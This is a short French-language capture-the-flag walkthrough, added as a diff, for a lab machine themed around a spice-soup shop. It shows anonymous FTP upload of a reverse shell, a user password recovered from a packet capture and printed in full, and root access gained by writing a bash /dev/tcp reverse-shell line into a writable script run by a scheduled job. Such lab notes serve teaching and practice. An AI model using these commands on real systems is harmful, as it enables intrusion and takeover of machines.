@@ -1,0 +1,22 @@
+User:
+	- Maya
+
+
+Le ftp en anonymous > put reverse shell dans le dossier ftp
+
+/recipe.txt => 
+"Someone asked what our main ingredient to our spice soup is today. 
+I figured I can't keep it a secret forever and told him it was love."
+
+
+user =>
+Dans /incidents il y a un fichier .pcapng
+Avec wireshark on trouve le password de lennie:c4ntg3t3n0ughsp1c3
+
+root =>
+Dans le dossier /lennie/scripts
+On voit que le script planner.sh appel un autre script: /etc/print.sh
+que nous pouvons modifier
+Ajouter une commande de reverse shell dans le print.sh: 
+-> echo "/bin/bash -c 'bash -i >& /dev/tcp/<@IP>/<Port> 0>&1'" > /etc/print.sh
+Et vous etes en root
